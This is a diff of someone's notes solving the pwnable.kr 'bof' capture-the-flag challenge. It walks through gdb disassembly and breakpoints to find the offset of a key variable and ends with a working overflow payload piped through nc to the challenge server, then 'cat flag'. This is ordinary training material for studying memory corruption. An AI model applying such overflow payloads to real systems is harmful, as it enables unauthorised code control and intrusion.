@@ -33,16 +33,16 @@ End of assembler dump.
 
 /////////////////////////////////////////////////////////////
 
-HERE IS CALL TO GETS: eax has the address of overflow me
-which is [ebp-0x2c]. so i need to overflow it to change value
+HERE IS CALL TO GETS: so I need to overflow it to change value
 of key.
 
    0x00000649 <+29>:	lea    eax,[ebp-0x2c]
    0x0000064c <+32>:	mov    DWORD PTR [esp],eax
    0x0000064f <+35>:	call   0x650 <func+36>
 
-Where is the 'key'?
 
+
+Where is the 'key'?
 First of all its dynamically linked so in order to load I do:
 
 
@@ -56,13 +56,13 @@ Breakpoint 1, 0x5655568d in main ()
 
 
 
-
 Inset a breakpoint before comparison
 
    0x56555654 <+40>:	cmp    DWORD PTR [ebp+0x8],0xcafebabe
 
 (gdb) b *0x56555654
 Breakpoint 2 at 0x56555654
+
 
 I write 32 bytes and search for key value (0xdeadbeef):
 
@@ -89,12 +89,12 @@ Breakpoint 2, 0x56555654 in func ()
 0xffffd190:	0x00000000	0xf7fe9450
 
 
-which is in 0xffffd120. And i wrote until 0x48484848. So i have
-to write more 5 words more. 5 + 8 = 13 words or 13 * 4 -> 52 bytes
+Key is in 0xffffd120. And i wrote until '0x48484848'. So i have
+to write 5 words more. 5 + 8 = 13 words or 13 * 4 -> 52 bytes
 
 
 
-TIME FOR THE TEST:
+TIME FOR THE TEST (Warning: Little endian. reverse bytes in 0xcafebabe):
 
 alex@kali:~/Downloads/pwnable_kr$ (python -c "print 'A' * 52 + '\xbe\xba\xfe\xca'"; cat) | nc pwnable.kr 9000
 cat flag
